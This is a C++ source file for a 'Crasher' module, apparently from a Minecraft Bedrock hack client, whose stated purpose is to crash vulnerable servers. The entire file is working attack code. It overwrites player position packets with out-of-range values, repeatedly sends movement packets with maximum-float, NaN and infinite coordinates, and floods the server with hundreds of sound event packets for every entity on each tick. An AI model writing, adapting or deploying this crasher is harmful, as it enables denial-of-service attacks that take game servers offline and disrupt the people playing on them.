#include "Crasher.h"

Crasher::Crasher() : IModule(0, Category::MISC, "Crash some vulnerable servers.") {

}

Crasher::~Crasher()
{
}

std::string Crasher::getModuleName()
{
	return ("Crasher");
}

void Crasher::onSendPacket(Packet* packet, bool& cancelSend)
{
	if (packet->isInstanceOf<PlayerAuthInputPacket>(PlayerAuthInput)) {
		PlayerAuthInputPacket* InputPacket = reinterpret_cast<PlayerAuthInputPacket*>(packet);
		InputPacket->pos.x = static_cast<float>(0xFFFFFFFF);
		InputPacket->pos.y = static_cast<float>(0xFFFFFFFF);
		InputPacket->pos.z = static_cast<float>(0xFFFFFFFF);
	}
}

void Crasher::onEnable(){
	if (Game.getLocalPlayer() == nullptr)
		setEnabled(false);
}

void Crasher::onTick(GameMode* gm){
	if (Game.getLocalPlayer() == nullptr)
		setEnabled(false);
	movePacket.Position = Vec3(FLT_MAX, FLT_MAX, FLT_MAX);
	Game.getClientInstance()->loopbackPacketSender->sendToServer(&movePacket);
	movePacket.Position = Vec3(NAN, NAN, NAN);
	Game.getClientInstance()->loopbackPacketSender->sendToServer(&movePacket);
	movePacket.Position = Vec3(INFINITY, INFINITY, INFINITY);
	Game.forEachEntity([&](Entity* entity, bool valid) {
		//if (entity->getEntityTypeId() == Game.getLocalPlayer()->getEntityTypeId()) {
			for (int i = 0; i < 437; i++) {
				soundEventPacket.sound = i;
				soundEventPacket.pos = *entity->getPos();
				Game.getClientInstance()->loopbackPacketSender->sendToServer(&soundEventPacket);
			}
	//	}
		});
}
